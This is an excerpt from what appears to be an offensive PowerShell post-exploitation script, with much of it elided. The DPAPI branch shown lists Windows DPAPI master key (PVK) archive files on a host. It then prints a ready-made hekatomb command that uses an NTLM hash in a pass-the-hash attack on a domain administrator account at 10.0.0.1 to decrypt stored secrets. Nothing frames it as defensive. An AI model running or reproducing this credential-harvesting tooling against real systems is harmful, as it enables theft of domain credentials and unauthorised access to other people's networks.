...
.Parameter Action
   Help, Check, Create, Dump, DPAPI, Delete (default: help) 
...
If($Action -iMatch '^(DPAPI)$')
{
   ...
   If($Dpapi1 -ne $null -or $Dpapi2 -ne $null)
   {
      ...
      ## Dump PVK archives location
      $GuidMasterKeyId = (Get-ChildItem -Path "$Location").FullName
      $GuidMasterKey = "$Location" + "\${GuidMasterKeyId}" -join ''
      ForEach($Item in $GuidMasterKeyId)
      {
         $PvkNames = ((Get-ChildItem -Path "$Item"|Select-Object *)).FullName
         If(-not([string]::IsNullOrEmpty($PvkNames)))
         {
            write-host "[pvk archives] " -NoNewline
            write-host "$PvkNames" -ForegroundColor Red 
         }
      }

      write-host "[decodehashes] " -NoNewLine
      write-host "hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug`n" -ForegroundColor Red
...
write-host "  @ShantyDamayanti`n" -ForegroundColor DarkGray
exit
}